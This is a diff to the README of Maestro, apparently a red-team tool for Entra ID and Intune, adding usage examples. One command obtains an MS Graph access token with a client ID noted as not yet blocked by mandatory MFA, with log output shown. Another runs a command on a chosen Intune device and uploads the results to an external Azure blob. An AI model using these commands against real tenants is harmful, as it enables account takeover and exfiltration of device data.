@@ -54,6 +54,17 @@ Some Maestro features were inspired by or built based on the work of others, inc
 If you're interested in collaborating, please hit me up on Twitter ([@_Mayyhem](https://twitter.com/_Mayyhem)) or in the [BloodHoundGang Slack](http://ghst.ly/BHSlack)!
 
 # Examples
+Get an access token for MS Graph using MSAL and the Azure PowerShell client ID (not yet prevented my mandatory MFA):
+```
+.\Maestro.exe get access-token -m 2 -t mayyhem.onmicrosoft.com -c 1950a258-227b-4e31-a9cf-717495945fc2 -s https://graph.microsoft.com/.default
+2025-02-06 21:09:24.701 UTC - [INFO]    Execution started
+2025-02-06 21:09:24.810 UTC - [INFO]    MSAL DLL loaded and ready for use.
+2025-02-06 21:09:24.810 UTC - [INFO]    SharpGetEntraToken attempting to get an access token
+2025-02-06 21:09:25.857 UTC - [INFO]    SharpGetEntraToken got an access token:
+eyJ0...tDOg
+2025-02-06 21:09:25.982 UTC - [INFO]    Completed execution in 00:00:01.3203797
+```
+
 Execute `dsregcmd.exe` on the Intune device with ID `e537180b-6d04-427e-bf93-dbde818400eb`, uploading results to the Azure Storage Blob Container SAS URL with a shared access token:
 ```
 .\Maestro.exe exec intune upload -i e537180b-6d04-427e-bf93-dbde818400eb -n MyPolicy --url 'https://maestro2go.blob.core.windows.net/uploads?st=2025-01-14T20:19:57Z&se=2025-01-15T04:19:57Z&si=All&sv=2022-11-02&sr=c&sig=QYri...ZkpA%3D' --commands "%windir%\system32\dsregcmd.exe"
